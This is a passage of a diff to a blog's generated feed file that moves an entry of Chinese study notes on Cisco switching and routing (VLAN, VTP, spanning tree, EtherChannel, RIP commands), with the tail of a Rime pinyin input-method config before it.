=&gt; hua, ...</span></span><br><span class="line">    <span class="comment"># 韻母部份</span></span><br><span class="line">    <span class="comment">#- derive/^([bpmf])eng$/$1ong/      # meng = mong, ...</span></span><br><span class="line">    - derive/([ei])n$/$1ng/            <span class="comment"># en =&gt; eng, in =&gt; ing</span></span><br><span class="line">    - derive/([ei])ng$/$1n/            <span class="comment"># eng =&gt; en, ing =&gt; in</span></span><br><span class="line">    - derive/^un/iong/                 <span class="comment"># un =&gt; iong</span></span><br><span class="line">    - derive/^iong/un/                 <span class="comment"># iong =&gt; un</span></span><br><span class="line">    <span class="comment"># 樣例足夠了，其他請自己總結……</span></span><br><span class="line">    <span class="comment"># 反模糊音？</span></span><br><span class="line">    <span class="comment"># 誰說方言沒有普通話精確、有模糊音，就能有反模糊音。</span></span><br><span class="line">    <span class="comment"># 示例爲分尖團的中原官話：</span></span><br><span class="line">    <span class="comment">#- derive/^ji$/zii/   # 在設計者安排下鳩佔鵲巢，尖音i只好雙寫了</span></span><br><span class="line">    <span class="comment">#- derive/^qi$/cii/</span></span><br><span class="line">    <span class="comment">#- derive/^xi$/sii/</span></span><br><span class="line">    <span class="comment">#- derive/^ji/zi/</span></span><br><span class="line">    <span class="comment">#- derive/^qi/ci/</span></span><br><span class="line">    <span class="comment">#- derive/^xi/si/</span></span><br><span class="line">    <span class="comment">#- derive/^ju/zv/</span></span><br><span class="line">    <span class="comment">#- derive/^qu/cv/</span></span><br><span class="line">    <span class="comment">#- derive/^xu/sv/</span></span><br><span class="line">    <span class="comment"># 韻母部份，只能從大面上覆蓋</span></span><br><span class="line">    <span class="comment">#- derive/^([bpm])o$/$1eh/          # bo =&gt; beh, ...</span></span><br><span class="line">    <span class="comment">#- derive/(^|[dtnlgkhzcs]h?)e$/$1eh/  # ge =&gt; geh, se =&gt; sheh, ...</span></span><br><span class="line">    <span class="comment">#- derive/^([gkh])uo$/$1ue/         # guo =&gt; gue, ...</span></span><br><span class="line">    <span class="comment">#- derive/^([gkh])e$/$1uo/          # he =&gt; huo, ...</span></span><br><span class="line">    <span class="comment">#- derive/([uv])e$/$1o/             # jue =&gt; juo, lve =&gt; lvo, ...</span></span><br><span class="line">    <span class="comment">#- derive/^fei$/fi/                 # fei =&gt; fi</span></span><br><span class="line">    <span class="comment">#- derive/^wei$/vi/                 # wei =&gt; vi</span></span><br><span class="line">    <span class="comment">#- derive/^([nl])ei$/$1ui/          # nei =&gt; nui, lei =&gt; lui</span></span><br><span class="line">    <span class="comment">#- derive/^([nlzcs])un$/$1vn/       # lun =&gt; lvn, zun =&gt; zvn, ...</span></span><br><span class="line">    <span class="comment">#- derive/^([nlzcs])ong$/$1iong/    # long =&gt; liong, song =&gt; siong, ...</span></span><br><span class="line">    <span class="comment"># 這個辦法雖從拼寫上做出了區分，然而受詞典制約，候選字仍是混的。</span></span><br><span class="line">    <span class="comment"># 只有真正的方音輸入方案纔能做到！但「反模糊音」這個玩法快速而有效！</span></span><br><span class="line">    <span class="comment"># 模糊音定義先於簡拼定義，方可令簡拼支持以上模糊音</span></span><br><span class="line">    - abbrev/^([a-z]).+$/$<span class="number">1</span>/           <span class="comment"># 簡拼（首字母）</span></span><br><span class="line">    - abbrev/^([zcs]h).+$/$<span class="number">1</span>/          <span class="comment"># 簡拼（zh, ch, sh）</span></span><br><span class="line">    <span class="comment"># 以下是一組容錯拼寫，《漢語拼音》方案以前者爲正</span></span><br><span class="line">    - derive/^([nl])ve$/$1ue/          <span class="comment"># nve = nue, lve = lue</span></span><br><span class="line">    - derive/^([jqxy])u/$1v/           <span class="comment"># ju = jv,</span></span><br><span class="line">    - derive/un$/uen/                  <span class="comment"># gun = guen,</span></span><br><span class="line">    - derive/ui$/uei/                  <span class="comment"># gui = guei,</span></span><br><span class="line">    - derive/iu$/iou/                  <span class="comment"># jiu = jiou,</span></span><br><span class="line">    <span class="comment"># 自動糾正一些常見的按鍵錯誤</span></span><br><span class="line">    - derive/([aeiou])ng$/$1gn/        <span class="comment"># dagn =&gt; dang</span></span><br><span class="line">    - derive/([dtngkhrzcs])o(u|ng)$/$1o/  <span class="comment"># zho =&gt; zhong|zhou</span></span><br><span class="line">    - derive/ong$/on/                  <span class="comment"># zhonguo =&gt; zhong guo</span></span><br><span class="line">    - derive/ao$/oa/                   <span class="comment"># hoa =&gt; hao</span></span><br><span class="line">    - derive/([iu])a(o|ng?)$/a$<span class="number">1</span>$<span class="number">2</span>/    <span class="comment"># tain =&gt; tian</span></span><br><span class="line">  <span class="comment"># 分尖團後 v =&gt; ü 的改寫條件也要相應地擴充：</span></span><br><span class="line">  <span class="comment">#&#x27;translator/preedit_format&#x27;:</span></span><br><span class="line">  <span class="comment">#  - &quot;xform/([nljqxyzcs])v/$1ü/&quot;</span></span><br></pre></td></tr></table></figure></li>
-</ol>
-]]></content>
-      <tags>
-        <tag>tools</tag>
-        <tag>open source</tag>
       </tags>
   </entry>
   <entry>
@@ -3016,348 +3028,6 @@
       </tags>
   </entry>
   <entry>
-    <title>SWITCH &amp; ROUTER</title>
-    <url>/2022/03/24/%E8%B7%AF%E7%94%B1%E4%B8%8E%E4%BA%A4%E6%8D%A2%E6%8A%80%E6%9C%AF/</url>
-    <content><![CDATA[<h1 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h1><ol>
-<li>交换机switch的基本功能<ol>
-<li>学习功能</li>
-<li>转发&#x2F;过滤</li>
-<li>支持冗余链路</li>
-<li>对VLAN（虚拟局域网）的支持</li>
-</ol>
-</li>
-<li>二层结构交换机特点：数据链路层，无三层口，需要虚拟接口vlan（vlan 1为默认管理接口，默认所有端口都在vlan1） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Switch&gt;enable </span><br><span class="line">Switch#configure terminal</span><br><span class="line">SwitchA (config-if)# no shutdown  	//开启</span><br></pre></td></tr></table></figure></li>
-<li>交换机分类：<ol>
-<li>按架构特点<br> a. 机架式、带扩展槽固定配置式、不带扩展槽固定配置式</li>
-<li>按应用规模</li>
-<li>按传输介质和传输速度</li>
-<li>按OSI的分层结构</li>
-</ol>
-</li>
-<li>二层交换机工作原理<ol>
-<li>根据收到数据帧总的源mac建立地址同交换机端口的映射，并将其写入mac地址表中</li>
-<li>交换机根据数据帧中的mac地址同已建立的mac地址表比较，在决定由哪个端口转发<ol>
-<li>目的mac地址不在mac表中，则向所有端口转发（广播）</li>
-<li>广播帧和组播帧向所有的端口转发</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>交换机交换方式：<ol>
-<li>直通</li>
-<li>存储转发</li>
-<li>碎片隔离</li>
-</ol>
-</li>
-<li>交换机的级联和堆叠<ol>
-<li>级联『分开配置』<ol>
-<li>使用Uplink端口级联</li>
-<li>使用普通端口级联</li>
-</ol>
-</li>
-<li>堆叠『总体配置』<ol>
-<li>菊花链式堆叠（类似：RAID冗余磁盘阵列）</li>
-<li>星型堆叠</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>交换机管理模式<ol>
-<li>超级终端管理模式<ul>
-<li>console口链接交换机（配置线DB9-to-DB9）</li>
-<li>波特率9600，数据位8</li>
-</ul>
-</li>
-<li>Telnet管理模式<ol>
-<li>相关配置 <figure class="highlight c"><figcaption><span>isco switch</span></figcaption><table><tr><td class="code"><pre><span class="line">switchA(config)<span class="meta"># <span class="keyword">line</span> vty 0 4  <span class="comment">// 指同时允许5个虚拟终端登陆进行配置</span></span></span><br><span class="line">switchA(config-line)<span class="meta"># password pwd1   <span class="comment">//password</span></span></span><br><span class="line">switchA(config-line)<span class="meta"># login  <span class="comment">//启用密码认证，默认关闭</span></span></span><br></pre></td></tr></table></figure></li>
-<li>配置登录密码： <figure class="highlight c"><figcaption><span>isco</span></figcaption><table><tr><td class="code"><pre><span class="line">SwitchA (config)<span class="meta"># enable secret level 1 0 pwd1  </span></span><br><span class="line"><span class="comment">// secret：MD5加密；</span></span><br><span class="line"><span class="comment">// level：指定密码用于哪个级别；</span></span><br><span class="line"><span class="comment">// 1：用户模式；</span></span><br><span class="line"><span class="comment">// 0：即将输入初始密码（5：cisco的MD5值）</span></span><br></pre></td></tr></table></figure></li>
-<li>配置特权模式口令 <figure class="highlight c"><figcaption><span>isco switch</span></figcaption><table><tr><td class="code"><pre><span class="line">SwitchA (config)<span class="meta"># enable secret level 14 0 pwd2</span></span><br></pre></td></tr></table></figure></li>
-</ol>
-</li>
-<li>Web管理模式<h1 id="虚拟局域网"><a href="#虚拟局域网" class="headerlink" title="虚拟局域网"></a>虚拟局域网</h1></li>
-</ol>
-</li>
-<li><h2 id="VLAN"><a href="#VLAN" class="headerlink" title="VLAN"></a>VLAN</h2><ol>
-<li>vlan的优点<ol>
-<li>限制网络上的广播，有助于控制流量</li>
-<li>降低成本</li>
-<li>简化网络管理，提高网络连接灵活性</li>
-<li>增强局域网安全性</li>
-</ol>
-</li>
-<li>Vlan划分方式类型<ol>
-<li>静态vlan：基于端口vlan，即指名各端口属于哪个vlan<ul>
-<li><pre><code>基于端口的vlan缺点
-</code></pre>
-<ol>
-<li>安全问题：物理攻击</li>
-<li>灵活性差，配置便捷性差</li>
-</ol>
-</li>
-</ul>
-</li>
-<li>动态vlan：MAC based VLAN、Subnet based VLAN、User Based VLAN</li>
-</ol>
-</li>
-<li>VLAN配置相关参数<ul>
-<li>access：主机连交换机、终端</li>
-<li>trunk：交换机互联</li>
-<li>range： 范围    </li>
-<li>PVID：（port vlan id）端口的vlanID号</li>
-</ul>
-</li>
-<li>IEEE802.1Q：<ol>
-<li>封装：将VLAN信息加入数据帧的包头，据有加标记能力的端口将会执行封装</li>
-<li>去封装：VLAN信息从数据帧头去掉，具有去封装能力的端口将会执行解封装<br> <img src="/:/d3d834ddc68a463782df866e5ee281d7" alt="64aac2f1d32778beaa3638d2943075ed.png"></li>
-</ol>
-</li>
-</ol>
-</li>
-<li><h2 id="VTP-VLAN-Trunking-Protocol-思科私有协议"><a href="#VTP-VLAN-Trunking-Protocol-思科私有协议" class="headerlink" title="VTP (VLAN Trunking Protocol 思科私有协议)"></a>VTP (VLAN Trunking Protocol 思科私有协议)</h2><ul>
-<li>VTP：VLAN中继协议 &#x2F; 虚拟局域网干道协议 （配置统一性：对VLAN进行统一管理）</li>
-<li>三种工作模式：<ol>
-<li>&#x3D;&#x3D;VTP Server&#x3D;&#x3D;：<ul>
-<li>可建删修改vlan</li>
-<li>可发送并转发相关通告信息，同步vlan配置</li>
-<li>配置保存在NVRAM</li>
-</ul>
-</li>
-<li>VTP Client ：<ul>
-<li>不可建删修改vlan</li>
-<li>但可转发通告、同步</li>
-<li>不保存配置到NVRAM</li>
-</ul>
-</li>
-<li>VTP Transparent：相当于独立的交换机，不参与vtp工作，不从vtp server学习，只拥有本设备上自维护的vlan信息</li>
-</ol>
-</li>
-</ul>
-<ol>
-<li>VTP相关操作<ol>
-<li>前置配置：trunk <figure class="highlight plaintext"><figcaption><span>switch</span></figcaption><table><tr><td class="code"><pre><span class="line"># switchport mode trunk</span><br></pre></td></tr></table></figure></li>
-<li>协议配置 <figure class="highlight plaintext"><figcaption><span>switch</span></figcaption><table><tr><td class="code"><pre><span class="line"># vtp mode &#123;server|client|transparent&#125;	//配置vtp模式</span><br><span class="line"># vtp domain &#123;test&#125;	//配置域名，默认为空</span><br><span class="line"># vtp password &#123;cisco&#125;	//配置pwd</span><br><span class="line"># vtp version 2	//配置version</span><br></pre></td></tr></table></figure></li>
-<li>vtp裁减  <figure class="highlight plaintext"><figcaption><span>switch</span></figcaption><table><tr><td class="code"><pre><span class="line"># vtp purning	//启用裁减，只需在server上配置</span><br></pre></td></tr></table></figure></li>
-</ol>
-<ul>
-<li>显示信息：<code>show vtp status</code><h1 id="网络优化-amp-安全策略"><a href="#网络优化-amp-安全策略" class="headerlink" title="网络优化 &amp; 安全策略"></a>网络优化 &amp; 安全策略</h1></li>
-</ul>
-</li>
-</ol>
-</li>
-<li><h2 id="生成树协议（STP）"><a href="#生成树协议（STP）" class="headerlink" title="生成树协议（STP）"></a>生成树协议（STP）</h2><ul>
-<li>STA：生成树算法</li>
-<li>BPDU：桥接协议数据单元（Bridge Protocol Data Unit）「两层」<ol>
-<li>版本号 00（IEEE802.1D）；02（IEEE802.1w）</li>
-<li>Bridge ID：交换机ID &#x3D; 交换机优先级 + 交换机mac地址</li>
-<li>Root ID：桥ID最小的位根ID</li>
-<li>Root Path Cost：到达根的路径开销</li>
-<li>PortID</li>
-<li>Hello Time：定期发送BPDU的时间间隔</li>
-<li>Max-Age Time：保留对方BPDU的时间间隔</li>
-<li>Forward-Delay Time发送延迟：端口状态改变的时间间隔</li>
-</ol>
-</li>
-<li>BID：网桥ID（Bridge ID）</li>
-<li>Root Bridge：根网桥（桥ID最小）</li>
-<li>Root Ports：根端口（到达根桥最佳路径）</li>
-<li>Designated Ports：指定端口</li>
-<li>Alternated Port：可选端口（既不是指定端口也不是根端口）</li>
-</ul>
-<ol>
-<li>生成树协议端口状态<ol>
-<li>禁用(Disabled)：关闭端口</li>
-<li>阻塞(Blocking)：不能接收或传输数据，不能吧mac地址加入地址表，只接收BPDU</li>
-<li>监听(Listening)：由根端口和指定端口担任，不能转发和传输，不能mac加入地址表，只能接收或发送BPDU</li>
-<li>学习(Learning)</li>
-<li>转发(Forwarding)</li>
-</ol>
-</li>
-<li>生成树协议配置<ol>
-<li>交换机优先级</li>
-<li>端口优先级</li>
-<li>配置HelloTime</li>
-<li>配置Forward-Delay Time</li>
-<li>配置Max-AgeTime</li>
-</ol>
-<ul>
-<li>Cisco系列SpanningTree默认配置：（# spanning-tree reset）<ul>
-<li>生成树协议PVST</li>
-<li>STP启用</li>
-<li>STP Proority：32768</li>
-<li>STP port Priority：128</li>
-<li>STP port cost：根据端口速率自动判断</li>
-<li>Hello Time：2s</li>
-<li>Forward-delay Time：15s</li>
-<li>Max-age Time：20s</li>
-</ul>
-<ol>
-<li>启用生成树协议</li>
-<li>关闭生成树协议</li>
-<li>配置生成树协议类型</li>
-<li>配置交换机优先级 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># spanning-tree priority 4096</span></span><br></pre></td></tr></table></figure></li>
-<li>优先级恢复默认值</li>
-<li>配置交换机端口优先级</li>
-<li>显示生成树状态</li>
-<li>显示端口生成树协议状态</li>
-</ol>
-</li>
-</ul>
-</li>
-<li>快速生成树协议（RSTP）：生成树改进，解决收敛慢问题<ol>
-<li>改进方案<ol>
-<li>为根端口和指定端口设置了快速切换用的替换端口（Alternate Port）和备份端口（Backup Port）</li>
-<li>在只连接了两个交换端口的点对点链路中，指定端口只需与下游交换机进行一次握手就可以无时延地进入转发状态</li>
-<li>直接与终端相连而不是把其他交换机相连的端口定义为边缘端口（Edge Port）。边缘端口可以直接进入转发状态，不需要任何延时。</li>
-</ol>
-</li>
-<li>端口三种状态<ol>
-<li>Discarding</li>
-<li>Learning</li>
-<li>Forwarding</li>
-</ol>
-<ul>
-<li>对比一般生成树少了监听listening和阻塞blocking</li>
-</ul>
-</li>
-<li>基于vlan的RSTP <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># show spanning-tree vlan 20</span></span><br></pre></td></tr></table></figure></li>
-</ol>
-</li>
-<li>多生成树（MSTP）</li>
-</ol>
-</li>
-<li><h2 id="端口聚合（Ethernet-Channel-以太通道）"><a href="#端口聚合（Ethernet-Channel-以太通道）" class="headerlink" title="端口聚合（Ethernet Channel 以太通道）"></a>端口聚合（Ethernet Channel 以太通道）</h2><ul>
-<li>一组物理端口联合成一个逻辑通道，即通道组，此逻辑通道视作一个端口</li>
-<li>自动提供冗余和负载均衡</li>
-</ul>
-<ol>
-<li>端口聚合类型<ol>
-<li>手工静态配置</li>
-<li>动态协议聚合<ol>
-<li>PAgA（思科私有）<ul>
-<li>On：通道成员不协商，直接开启端口聚合（静态）</li>
-<li>auto：主动</li>
-<li>desirable：被动协商，不发送，只接受协商消息</li>
-<li>Off：关闭</li>
-</ul>
-</li>
-<li>LACP<ul>
-<li>active：主动</li>
-<li>passive：被动协商，不发送，只接受协商消息</li>
-<li>On</li>
-<li>Off</li>
-</ul>
-</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>链路聚合配置<ul>
-<li>先配置后连线（连线后会生成环路，阻塞） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># int range f0/1-2	</span><br><span class="line"># channel-group 10 mode on	//f1-2加入逻辑端口组10号</span><br><span class="line"># port-channel load-balance mothod	//设置端口负载均衡算法</span><br></pre></td></tr></table></figure>
- 查看端口配置状态 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># show etherchannel summary</span><br></pre></td></tr></table></figure>
-<h1 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h1></li>
-</ul>
-</li>
-</ol>
-</li>
-<li><h2 id="路由器概述"><a href="#路由器概述" class="headerlink" title="路由器概述"></a>路由器概述</h2><ul>
-<li>基本功能<ol>
-<li>网络互连</li>
-<li>数据处理</li>
-<li>网络管理</li>
-</ol>
-</li>
-<li>分类<ol>
-<li>固定配置路由器</li>
-<li>模块化路由器</li>
-</ol>
-</li>
-<li>控制线缆<ol>
-<li>以太网线缆</li>
-<li>控制台线缆</li>
-<li>串行广域网线缆</li>
-</ol>
-</li>
-<li>常用配置方式<ol>
-<li>控制台方式</li>
-<li>Telnet方式</li>
-<li>网管工作站方式</li>
-<li>TFTP服务器方式</li>
-</ol>
-</li>
-</ul>
-</li>
-<li><h2 id="路由器基础配置"><a href="#路由器基础配置" class="headerlink" title="路由器基础配置"></a>路由器基础配置</h2><h1 id="动态路由协议"><a href="#动态路由协议" class="headerlink" title="动态路由协议"></a>动态路由协议</h1></li>
-<li><h2 id="动态路由协议基础概念"><a href="#动态路由协议基础概念" class="headerlink" title="动态路由协议基础概念"></a>动态路由协议基础概念</h2><ul>
-<li>Cisco三种路由方式<ol>
-<li>静态路由：手工定义目的地和路由转发</li>
-<li>动态路由：路由器根据路由表灵活调整</li>
-<li>默认路由：当前路由表中无匹配表项时，做出的默认选择</li>
-</ol>
-</li>
-<li>动态路由优势：<ul>
-<li>灵活调整路由表，选择最优路径</li>
-<li>均衡负载（Load Sharing）</li>
-</ul>
-</li>
-</ul>
-<ol>
-<li>自治域系统</li>
-<li>路由协议分类</li>
-<li>邻居关系</li>
-<li>网络路径的度量</li>
-<li>收敛时间</li>
-</ol>
-</li>
-<li><h2 id="RIP协议（典型的距离矢量路由选择算法的内部网关协议）"><a href="#RIP协议（典型的距离矢量路由选择算法的内部网关协议）" class="headerlink" title="RIP协议（典型的距离矢量路由选择算法的内部网关协议）"></a>RIP协议（典型的距离矢量路由选择算法的内部网关协议）</h2><ol>
-<li>特征<ul>
-<li>距离矢量：以跳数为度量值（metric）的距离向量协议</li>
-<li>RIP基于UDP，端口520的应用层协议</li>
-<li>跳数不超过15</li>
-</ul>
-</li>
-<li>分类<ol>
-<li>RIPv1<ul>
-<li>有类路由协议</li>
-<li>没有认证功能</li>
-<li>没有手工汇总功能</li>
-<li>广播更新</li>
-</ul>
-</li>
-<li>RIPv2<ul>
-<li><strong>无类路由协议</strong>（不规则IP地址，如10.xx.xx.xx 255.255.255.0）</li>
-<li>支持明文和MD5认证功能</li>
-<li>可在关闭自动汇总功能前提下，进行手工汇总</li>
-<li>组播更新</li>
-</ul>
-</li>
-</ol>
-</li>
-<li>RIP配置<ul>
-<li>配置步骤：<ol>
-<li>配置路由器接口ip</li>
-<li>配置路由RIP</li>
-<li>DHCP服务配置</li>
-<li>测试 <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">启用</span><br><span class="line"><span class="section"># router rip	</span></span><br><span class="line">查看路由表</span><br><span class="line">添加网段</span><br><span class="line"><span class="section"># network [network-num]</span></span><br><span class="line">删除网段</span><br><span class="line"><span class="section"># network [network-num]</span></span><br><span class="line">将版本改为RIPv2</span><br><span class="line"><span class="section"># version 2</span></span><br><span class="line"><span class="section"># no auto-summary</span></span><br><span class="line"><span class="section"># show ip router  </span></span><br><span class="line"><span class="code">	&gt; R	192.168.xx.0/24[120/?] </span></span><br><span class="line"><span class="code">		1. ？: 标识RIP传递跳数) </span></span><br><span class="line"><span class="code">		2. 120：管理距离</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure></li>
-</ol>
-</li>
-</ul>
-</li>
-</ol>
-</li>
-<li><h2 id="OSPF路由协议"><a href="#OSPF路由协议" class="headerlink" title="OSPF路由协议"></a>OSPF路由协议</h2></li>
-<li><h2 id="EIGRP协议"><a href="#EIGRP协议" class="headerlink" title="EIGRP协议"></a>EIGRP协议</h2></li>
-<li><h2 id="路由重发布"><a href="#路由重发布" class="headerlink" title="路由重发布"></a>路由重发布</h2></li>
-</ol>
-]]></content>
-      <categories>
-        <category>路由与交换</category>
-      </categories>
-      <tags>
-        <tag>交换机</tag>
-        <tag>路由器</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>数据结构知识笔记</title>
     <url>/2021/05/29/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84NOTE/</url>
     <content><![CDATA[<h1 id="一、数据结构绪论"><a href="#一、数据结构绪论" class="headerlink" title="一、数据结构绪论"></a>一、数据结构绪论</h1><ol>
@@ -4484,6 +4154,348 @@
       <tags>
         <tag>算法</tag>
         <tag>数据结构</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SWITCH &amp; ROUTER</title>
+    <url>/2022/03/24/%E8%B7%AF%E7%94%B1%E4%B8%8E%E4%BA%A4%E6%8D%A2%E6%8A%80%E6%9C%AF/</url>
+    <content><![CDATA[<h1 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h1><ol>
+<li>交换机switch的基本功能<ol>
+<li>学习功能</li>
+<li>转发&#x2F;过滤</li>
+<li>支持冗余链路</li>
+<li>对VLAN（虚拟局域网）的支持</li>
+</ol>
+</li>
+<li>二层结构交换机特点：数据链路层，无三层口，需要虚拟接口vlan（vlan 1为默认管理接口，默认所有端口都在vlan1） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Switch&gt;enable </span><br><span class="line">Switch#configure terminal</span><br><span class="line">SwitchA (config-if)# no shutdown  	//开启</span><br></pre></td></tr></table></figure></li>
+<li>交换机分类：<ol>
+<li>按架构特点<br> a. 机架式、带扩展槽固定配置式、不带扩展槽固定配置式</li>
+<li>按应用规模</li>
+<li>按传输介质和传输速度</li>
+<li>按OSI的分层结构</li>
+</ol>
+</li>
+<li>二层交换机工作原理<ol>
+<li>根据收到数据帧总的源mac建立地址同交换机端口的映射，并将其写入mac地址表中</li>
+<li>交换机根据数据帧中的mac地址同已建立的mac地址表比较，在决定由哪个端口转发<ol>
+<li>目的mac地址不在mac表中，则向所有端口转发（广播）</li>
+<li>广播帧和组播帧向所有的端口转发</li>
+</ol>
+</li>
+</ol>
+</li>
+<li>交换机交换方式：<ol>
+<li>直通</li>
+<li>存储转发</li>
+<li>碎片隔离</li>
+</ol>
+</li>
+<li>交换机的级联和堆叠<ol>
+<li>级联『分开配置』<ol>
+<li>使用Uplink端口级联</li>
+<li>使用普通端口级联</li>
+</ol>
+</li>
+<li>堆叠『总体配置』<ol>
+<li>菊花链式堆叠（类似：RAID冗余磁盘阵列）</li>
+<li>星型堆叠</li>
+</ol>
+</li>
+</ol>
+</li>
+<li>交换机管理模式<ol>
+<li>超级终端管理模式<ul>
+<li>console口链接交换机（配置线DB9-to-DB9）</li>
+<li>波特率9600，数据位8</li>
+</ul>
+</li>
+<li>Telnet管理模式<ol>
+<li>相关配置 <figure class="highlight c"><figcaption><span>isco switch</span></figcaption><table><tr><td class="code"><pre><span class="line">switchA(config)<span class="meta"># <span class="keyword">line</span> vty 0 4  <span class="comment">// 指同时允许5个虚拟终端登陆进行配置</span></span></span><br><span class="line">switchA(config-line)<span class="meta"># password pwd1   <span class="comment">//password</span></span></span><br><span class="line">switchA(config-line)<span class="meta"># login  <span class="comment">//启用密码认证，默认关闭</span></span></span><br></pre></td></tr></table></figure></li>
+<li>配置登录密码： <figure class="highlight c"><figcaption><span>isco</span></figcaption><table><tr><td class="code"><pre><span class="line">SwitchA (config)<span class="meta"># enable secret level 1 0 pwd1  </span></span><br><span class="line"><span class="comment">// secret：MD5加密；</span></span><br><span class="line"><span class="comment">// level：指定密码用于哪个级别；</span></span><br><span class="line"><span class="comment">// 1：用户模式；</span></span><br><span class="line"><span class="comment">// 0：即将输入初始密码（5：cisco的MD5值）</span></span><br></pre></td></tr></table></figure></li>
+<li>配置特权模式口令 <figure class="highlight c"><figcaption><span>isco switch</span></figcaption><table><tr><td class="code"><pre><span class="line">SwitchA (config)<span class="meta"># enable secret level 14 0 pwd2</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li>Web管理模式<h1 id="虚拟局域网"><a href="#虚拟局域网" class="headerlink" title="虚拟局域网"></a>虚拟局域网</h1></li>
+</ol>
+</li>
+<li><h2 id="VLAN"><a href="#VLAN" class="headerlink" title="VLAN"></a>VLAN</h2><ol>
+<li>vlan的优点<ol>
+<li>限制网络上的广播，有助于控制流量</li>
+<li>降低成本</li>
+<li>简化网络管理，提高网络连接灵活性</li>
+<li>增强局域网安全性</li>
+</ol>
+</li>
+<li>Vlan划分方式类型<ol>
+<li>静态vlan：基于端口vlan，即指名各端口属于哪个vlan<ul>
+<li><pre><code>基于端口的vlan缺点
+</code></pre>
+<ol>
+<li>安全问题：物理攻击</li>
+<li>灵活性差，配置便捷性差</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>动态vlan：MAC based VLAN、Subnet based VLAN、User Based VLAN</li>
+</ol>
+</li>
+<li>VLAN配置相关参数<ul>
+<li>access：主机连交换机、终端</li>
+<li>trunk：交换机互联</li>
+<li>range： 范围    </li>
+<li>PVID：（port vlan id）端口的vlanID号</li>
+</ul>
+</li>
+<li>IEEE802.1Q：<ol>
+<li>封装：将VLAN信息加入数据帧的包头，据有加标记能力的端口将会执行封装</li>
+<li>去封装：VLAN信息从数据帧头去掉，具有去封装能力的端口将会执行解封装<br> <img src="/:/d3d834ddc68a463782df866e5ee281d7" alt="64aac2f1d32778beaa3638d2943075ed.png"></li>
+</ol>
+</li>
+</ol>
+</li>
+<li><h2 id="VTP-VLAN-Trunking-Protocol-思科私有协议"><a href="#VTP-VLAN-Trunking-Protocol-思科私有协议" class="headerlink" title="VTP (VLAN Trunking Protocol 思科私有协议)"></a>VTP (VLAN Trunking Protocol 思科私有协议)</h2><ul>
+<li>VTP：VLAN中继协议 &#x2F; 虚拟局域网干道协议 （配置统一性：对VLAN进行统一管理）</li>
+<li>三种工作模式：<ol>
+<li>&#x3D;&#x3D;VTP Server&#x3D;&#x3D;：<ul>
+<li>可建删修改vlan</li>
+<li>可发送并转发相关通告信息，同步vlan配置</li>
+<li>配置保存在NVRAM</li>
+</ul>
+</li>
+<li>VTP Client ：<ul>
+<li>不可建删修改vlan</li>
+<li>但可转发通告、同步</li>
+<li>不保存配置到NVRAM</li>
+</ul>
+</li>
+<li>VTP Transparent：相当于独立的交换机，不参与vtp工作，不从vtp server学习，只拥有本设备上自维护的vlan信息</li>
+</ol>
+</li>
+</ul>
+<ol>
+<li>VTP相关操作<ol>
+<li>前置配置：trunk <figure class="highlight plaintext"><figcaption><span>switch</span></figcaption><table><tr><td class="code"><pre><span class="line"># switchport mode trunk</span><br></pre></td></tr></table></figure></li>
+<li>协议配置 <figure class="highlight plaintext"><figcaption><span>switch</span></figcaption><table><tr><td class="code"><pre><span class="line"># vtp mode &#123;server|client|transparent&#125;	//配置vtp模式</span><br><span class="line"># vtp domain &#123;test&#125;	//配置域名，默认为空</span><br><span class="line"># vtp password &#123;cisco&#125;	//配置pwd</span><br><span class="line"># vtp version 2	//配置version</span><br></pre></td></tr></table></figure></li>
+<li>vtp裁减  <figure class="highlight plaintext"><figcaption><span>switch</span></figcaption><table><tr><td class="code"><pre><span class="line"># vtp purning	//启用裁减，只需在server上配置</span><br></pre></td></tr></table></figure></li>
+</ol>
+<ul>
+<li>显示信息：<code>show vtp status</code><h1 id="网络优化-amp-安全策略"><a href="#网络优化-amp-安全策略" class="headerlink" title="网络优化 &amp; 安全策略"></a>网络优化 &amp; 安全策略</h1></li>
+</ul>
+</li>
+</ol>
+</li>
+<li><h2 id="生成树协议（STP）"><a href="#生成树协议（STP）" class="headerlink" title="生成树协议（STP）"></a>生成树协议（STP）</h2><ul>
+<li>STA：生成树算法</li>
+<li>BPDU：桥接协议数据单元（Bridge Protocol Data Unit）「两层」<ol>
+<li>版本号 00（IEEE802.1D）；02（IEEE802.1w）</li>
+<li>Bridge ID：交换机ID &#x3D; 交换机优先级 + 交换机mac地址</li>
+<li>Root ID：桥ID最小的位根ID</li>
+<li>Root Path Cost：到达根的路径开销</li>
+<li>PortID</li>
+<li>Hello Time：定期发送BPDU的时间间隔</li>
+<li>Max-Age Time：保留对方BPDU的时间间隔</li>
+<li>Forward-Delay Time发送延迟：端口状态改变的时间间隔</li>
+</ol>
+</li>
+<li>BID：网桥ID（Bridge ID）</li>
+<li>Root Bridge：根网桥（桥ID最小）</li>
+<li>Root Ports：根端口（到达根桥最佳路径）</li>
+<li>Designated Ports：指定端口</li>
+<li>Alternated Port：可选端口（既不是指定端口也不是根端口）</li>
+</ul>
+<ol>
+<li>生成树协议端口状态<ol>
+<li>禁用(Disabled)：关闭端口</li>
+<li>阻塞(Blocking)：不能接收或传输数据，不能吧mac地址加入地址表，只接收BPDU</li>
+<li>监听(Listening)：由根端口和指定端口担任，不能转发和传输，不能mac加入地址表，只能接收或发送BPDU</li>
+<li>学习(Learning)</li>
+<li>转发(Forwarding)</li>
+</ol>
+</li>
+<li>生成树协议配置<ol>
+<li>交换机优先级</li>
+<li>端口优先级</li>
